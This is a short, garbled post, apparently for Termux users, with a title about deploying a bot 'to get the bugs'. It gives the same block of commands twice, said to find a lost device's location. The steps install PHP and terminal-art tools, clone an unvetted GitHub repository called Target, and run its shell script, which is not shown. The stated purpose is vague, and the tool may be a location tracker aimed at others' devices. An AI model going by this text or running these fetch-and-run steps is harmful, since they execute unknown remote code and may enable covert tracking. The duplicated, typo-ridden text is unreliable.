😅😅😅😅😅😅😅😅LOL.....DEPLOY THE BOT IN ORDER TO GET THE BUGS
by the using of following commands we can ffind our lose device loc.ation.

$ apt update && apt upgrade

$ pkg install wget

$ gem install lolcat

$ pkg install php

$ pkg install toilet

$ git clone https://github.com/sparkz-technology/Target.git

$ cd Target

$ ls

$ chmod +x Target.sh

$ bash Target.sh



by the using of following commands we can ffind our lose device loc.ation.

$ apt update && apt upgrade

$ pkg install wget

$ gem install lolcat

$ pkg install php

$ pkg install toilet

$ git clone https://github.com/sparkz-technology/Target.git

$ cd Target

$ ls

$ chmod +x Target.sh

$ bash Target.sh
